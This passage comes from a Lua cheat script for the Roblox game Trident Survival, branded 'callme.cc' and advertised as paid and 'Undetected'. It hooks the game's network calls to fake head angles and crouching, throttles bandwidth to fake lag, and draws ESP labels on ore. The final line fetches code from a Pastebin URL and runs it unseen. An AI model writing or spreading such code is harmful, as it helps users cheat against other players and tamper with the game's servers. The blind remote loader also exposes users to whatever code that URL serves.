    args[3] = 1.5000001192092896
  elseif SpinbotType == "Normal" or SpinBotV == false then
    args[3] = -1.5000001192092896
  elseif SpinbotType == "Random" or SpinBotV == false then
    args[3] = -1.5000001192092896
  end
end
return OldSpinHook(self, unpack(args))
end)
task.spawn(function()
while task.wait() do
  if SpinbotType == "Desync" then
    SpinBotV = not SpinBotV
  end
end
end)
task.spawn(function()
while task.wait(0.1) do
  if SpinbotType == "Desync" or SpinbotType == "Random" then
    SpinBotLM = not SpinBotLM
  end
end
end)

SpinbotTab:AddToggle('FakeCrouch', {Text = 'fake duck',Default = false,Tooltip = 'Makes u crouch for other people also they cant hear your footsteps'})
local OldCrouchHook; OldCrouchHook = hookfunction(game:GetService("Players").LocalPlayer:FindFirstChild("RemoteEvent").FireServer, function(self, ...)
local args = {...}
if args[1] == 2 and fakeduck == true then
  args[2] = true
end
return OldCrouchHook(self, unpack(args))
end)
Toggles.FakeCrouch:OnChanged(function() fakeduck = Toggles.FakeCrouch.Value end)
local function onFakeLagToggled(value)
  local networkClient = game:GetService("NetworkClient")
  networkClient:SetOutgoingKBPSLimit(value and 1 or 100)
end
SpinbotTab:AddToggle('FakeLag', {Text = 'fake lag', Default = false}):OnChanged(onFakeLagToggled)



local WorldEspTabBox = Tabs.Visuals:AddRightTabbox('world esp')
local WorldEspTab = WorldEspTabBox:AddTab('world esp')

--* Player Settings *--

_G.SettingsOre = {
iron = {
  enabled = true,
  colour = Color3.fromRGB(199, 172, 120),
},
nitrate = {
  enabled = true,
  colour = Color3.fromRGB(248, 248, 248),
},
stone = {
  enabled = true,
  colour = Color3.fromRGB(205, 205, 205),
},
oreDistance = 1000,
}
local settings1 = _G.SettingsOre
if settings1 == nil then
return
end

WorldEspTab:AddToggle('iron_Toggle',{Text='enabled',Default=false})

WorldEspTab:AddSlider('OreRenderDistance', {Text='distance:',Default=1000,Min=1,Max=2500,Rounding=0,Compact=false,Suffix=" studs"}):OnChanged(function(Value)
settings1.oreDistance = Value
end)

WorldEspTab:AddToggle('iron_Toggle',{Text='iron ore',Default=false}):AddColorPicker('IronColor', { Default = Color3.fromRGB(199, 172, 120), Title = 'Color', }):OnChanged(function(Value)
settings1.iron.enabled = Value
end)
Options.IronColor:OnChanged(function(Value)
settings1.iron.colour = Value
if settings1.iron.enabled then
settings1.iron.enabled = false
task.wait(0.01)
settings1.iron.enabled = true
end
end)

WorldEspTab:AddToggle('nitrate_Toggle',{Text='nitrate ore',Default=false}):AddColorPicker('NitrateColor', { Default = Color3.fromRGB(248, 248, 248), Title = 'Color', }):OnChanged(function(Value)
settings1.nitrate.enabled = Value
end)
Options.NitrateColor:OnChanged(function(Value)
settings1.nitrate.colour = Value
if settings1.nitrate.enabled then
settings1.nitrate.enabled = false
task.wait(0.01)
settings1.nitrate.enabled = true
end
end)

WorldEspTab:AddToggle('stone_Toggle',{Text='stone ore',Default=false}):AddColorPicker('StoneColor', { Default = Color3.fromRGB(205, 205, 205), Title = 'Color', }):OnChanged(function(Value)
settings1.stone.enabled = Value
end)
Options.StoneColor:OnChanged(function(Value)
settings1.stone.colour = Value
if settings1.stone.enabled then
settings1.stone.enabled = false
task.wait(0.01)
settings1.stone.enabled = true
end
end)

local Text1Font = 2
local textoutlines = true
local testsize = 11
local function get_text(text, position)
local distance = math.floor((position - workspace.Ignore.LocalCharacter.Middle.Position).Magnitude)
local final_text = tostring(text) .. "\n[" .. tostring(distance) .. "] studs"
return tostring(final_text)
end
local function worldtoviewport(position)
local a, b = workspace.CurrentCamera:WorldToViewportPoint(position)
return Vector2.new(a.X, a.Y), b
end
local function add_esp(part, text, colour, toggle)
local drawing_text = Drawing.new("Text")
drawing_text.Outline = textoutlines
drawing_text.Center = true
drawing_text.Visible = false
drawing_text.Font = Text1Font
drawing_text.Size = testsize
drawing_text.Color = colour
local rendersteploop = game:GetService("RunService").RenderStepped:connect(function()pcall(function()
if not part:IsDescendantOf(workspace) or not settings1 then
  table.remove(oresDebris,part)
  drawing_text:Remove()
  rendersteploop:Disconnect()
end
local part_pos = part.Position
local screen_pos, on_screen = worldtoviewport(part_pos)
if not on_screen then
  drawing_text.Visible = false
  drawing_text.Size = testsize
  drawing_text.Outline = textoutlines
  drawing_text.Font = Text1Font
  rendersteploop:Disconnect()
end
local oreDis = (game:GetService("Workspace").Ignore.LocalCharacter:WaitForChild("Top"):GetPivot().Position-part_pos).Magnitude
if oreDis >= settings1.oreDistance then
  drawing_text.Visible = false
  drawing_text.Size = testsize
  drawing_text.Outline = textoutlines
  drawing_text.Font = Text1Font
  rendersteploop:Disconnect()
end
if text == 'Iron' and not settings1.iron.enabled then
  drawing_text.Visible = false
  drawing_text.Color = settings1.iron.colour
  rendersteploop:Disconnect()
else if text == 'Nitrate' and not settings1.nitrate.enabled then
  drawing_text.Visible = false
  drawing_text.Color = settings1.nitrate.colour
  rendersteploop:Disconnect()
else if text == 'Stone' and not settings1.stone.enabled then
  drawing_text.Visible = false
  drawing_text.Color = settings1.stone.colour
  rendersteploop:Disconnect()
end
end
end
drawing_text.Visible = true
drawing_text.Text = get_text(text, part_pos)
drawing_text.Position = screen_pos
drawing_text.Size = testsize
drawing_text.Outline = textoutlines
drawing_text.Font = Text1Font
rendersteploop:Disconnect()
end)
end)
end
local function filter_models(v)
if (not v:IsA("Model")) then
return
end
local is_part = v:FindFirstChild("Part")
local children = v:GetChildren()
local child_amount = #children
if is_part then
if child_amount == 1 then
add_esp(is_part, "Stone", settings1.stone.colour, settings1.stone.enabled)
elseif child_amount == 2 then
for _, v in pairs(children) do
  local brickcolor = v.BrickColor
  local is_ore = v.ClassName == "MeshPart" and v.Name == "Part"
  if is_ore then
    if brickcolor == BrickColor.new("Institutional white") then
      add_esp(v, "Nitrate", settings1.nitrate.colour, settings1.nitrate.enabled)
    elseif brickcolor == BrickColor.new("Burlap") then
      add_esp(v, "Iron", settings1.iron.colour, settings1.iron.enabled)
    end
  end
end
end
end
end
for index, model in pairs(workspace:GetChildren()) do
filter_models(model)
end
workspace.ChildAdded:Connect(function(model)
filter_models(model)
end)

WorldEspTab:AddDivider("")

WorldEspTab:AddToggle('TextOutline2',{Text='text outlines',Default=true}):OnChanged(function(Value)
textoutlines = Value
end)

WorldEspTab:AddSlider('TextSizeSlider2', {Text = 'text size:', Default = 12, Min = 1, Max = 25, Rounding = 0, Suffix = "px", Compact = false}):OnChanged(function(TextSizeValue2)
testsize = TextSizeValue2
end)

WorldEspTab:AddDropdown('EspFont2',{Values={"0","1","2","3"},Default=3,Multi=false,Text='font:'}):OnChanged(function(Value)
Text1Font = Value
end)

-------------------------------------------------------------------------------------------------
--// Loops, Functionality & Other \\--








--// CREDITS \\--




Library:SetWatermarkVisibility(true)

local FrameTimer = tick()
local FrameCounter = 0;
local FPS = 60;

local WatermarkConnection = game:GetService('RunService').RenderStepped:Connect(function()
    FrameCounter += 1;

    if (tick() - FrameTimer) >= 1 then
        FPS = FrameCounter;
        FrameTimer = tick();
        FrameCounter = 0;
    end;

    Library:SetWatermark(("‚≠êcallme.cc‚≠ê | Build: PAID | Game: Trident Survival"):format(
        math.floor(FPS),
        math.floor(game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue())
    ));
end);

Library.KeybindFrame.Visible = true;

Library:OnUnload(function()
    WatermarkConnection:Disconnect()

    print('Unloaded!')
    Library.Unloaded = true
end)

local MenuGroup = Tabs['UI Settings']:AddRightGroupbox('Menu')

MenuGroup:AddButton('Unload', function() Library:Unload() end)
MenuGroup:AddButton("Rejoin Server", function()
    Library:Notify("Rejoining", 30)
    wait(1)
    local ts = game:GetService("TeleportService")
    local p = game:GetService("Players").LocalPlayer
    ts:Teleport(game.PlaceId, p)
end)
MenuGroup:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'K', NoUI = true, Text = 'Menu keybind' })
MenuGroup:AddDivider()
local playerCountLabel = MenuGroup:AddLabel("Player Count: 0", nil, true)
local function updatePlayerCount()
local playerCount = #game:GetService("Players"):GetPlayers()
playerCountLabel:SetText("Players Online : " .. playerCount)
end
game:GetService("Players").PlayerAdded:Connect(updatePlayerCount)
game:GetService("Players").PlayerRemoving:Connect(updatePlayerCount)
updatePlayerCount()
MenuGroup:AddDivider()
MenuGroup:AddLabel('Credits', true)
MenuGroup:AddLabel('Made by ‚≠êcallme.cc‚≠ê', true)
Library.ToggleKeybind = Options.MenuKeybind

ThemeManager:SetLibrary(Library)
SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()

SaveManager:SetIgnoreIndexes({ 'MenuKeybind' })

ThemeManager:SetFolder('‚≠êcallme.cc‚≠ê')
SaveManager:SetFolder('‚≠êcallme.cc‚≠ê/TRIDENT SURVIVAL')

SaveManager:BuildConfigSection(Tabs['UI Settings'])

ThemeManager:ApplyToTab(Tabs['UI Settings'])

SaveManager:LoadAutoloadConfig()
wait(0)Library:Notify("Thanks for using ‚≠êcallme.cc‚≠ê")
wait(0)Library:Notify("Status : üü¢Undetected")



loadstring(game:HttpGet("https://pastebin.com/raw/WTWsBvp4", true))();


